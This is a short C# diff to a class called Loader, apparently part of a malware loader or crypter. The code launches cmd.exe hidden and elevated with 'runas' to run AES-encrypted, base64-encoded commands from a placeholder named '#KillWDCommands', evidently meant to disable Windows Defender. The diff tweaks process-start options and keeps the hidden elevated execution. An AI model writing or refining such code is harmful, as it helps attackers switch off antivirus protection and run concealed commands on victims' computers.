@@ -36,9 +36,7 @@ public partial class Loader
                 Arguments = "/c " + Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String("#KillWDCommands"))) + " & exit",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                Verb = "runas",
+                Verb = "runas"
             });
         }
         catch (Exception ex)
